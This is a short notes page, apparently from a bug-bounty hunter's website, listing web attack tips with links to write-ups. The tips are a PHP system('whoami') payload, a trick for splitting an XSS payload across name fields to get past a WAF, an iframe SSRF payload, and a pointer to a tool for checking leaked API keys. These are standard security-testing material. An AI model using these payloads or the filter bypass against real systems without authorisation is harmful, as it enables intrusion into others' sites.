---
layout: page
title: Notes
cover-img: /assets/img/notes.jpg
subtitle: Notes and thoughts
---

1. Use this as payload, when it is vulnerable to xss: `<?php system('whoami'); ?>` [link](https://amakki.me/how-i-made-15k-from-remote-code-execution-vulnerability-2e1b14b3902a)

2. If WAF blocked your payload, you can bypass it by separating the payload. [link](https://twitter.com/AMakki1337/status/1478048809217400837)

    First Name: `<svg`

    Last Name: `onload=alert(1)>`

    Name: `<svg onload=alert(1)>`

3. This can be a payload for SSRF: `<iframe src='https://labs.amakki.me'>` [link](https://amakki.me/full-ssrf-by-exporting-pdf-bbe1bfde24c4)

4. Got some api keys, let's check this [KeyHacks](https://github.com/streaak/keyhacks) 

5. Another nice payload for XSS: [link](https://brutelogic.com.br/poc.svg)

